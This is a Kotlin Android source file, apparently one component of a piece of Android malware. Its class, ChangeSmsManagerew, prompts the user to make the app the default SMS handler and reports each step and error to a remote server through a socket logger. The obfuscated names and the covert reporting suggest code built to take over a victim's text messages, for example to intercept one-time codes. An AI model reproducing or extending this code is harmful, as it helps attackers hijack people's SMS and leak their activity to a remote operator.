package com.xxx.zzz.smsp

import android.app.Activity
import android.app.role.RoleManager
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Telephony
import com.xxx.zzz.socketsp.IOSocketyt

class ChangeSmsManagerew : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val roleManager = applicationContext.getSystemService(RoleManager::class.java)
            val isRoleAvailable = roleManager.isRoleAvailable(RoleManager.ROLE_SMS)
            if (isRoleAvailable) {
                val isRoleHeld = roleManager.isRoleHeld(RoleManager.ROLE_SMS)
                if (!isRoleHeld) {
                    val roleRequestIntent = roleManager.createRequestRoleIntent(RoleManager.ROLE_SMS)
                    startActivityForResult(roleRequestIntent, 1)
                    IOSocketyt.sendLogs("", "ChangeSmsManagerew onCreate", "success")
                    finish()
                }
            }
        } else {
            finish()
        }
    }

    companion object {
        fun swapSmsManager(context: Context, packageName: String?) {
            try {
                val intent = Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName)
                context.startActivity(intent)
            } catch (ex: Exception) {
                IOSocketyt.sendLogs("", "swapSmsManager ${ex.localizedMessage}", "error")
            }
        }
    }
}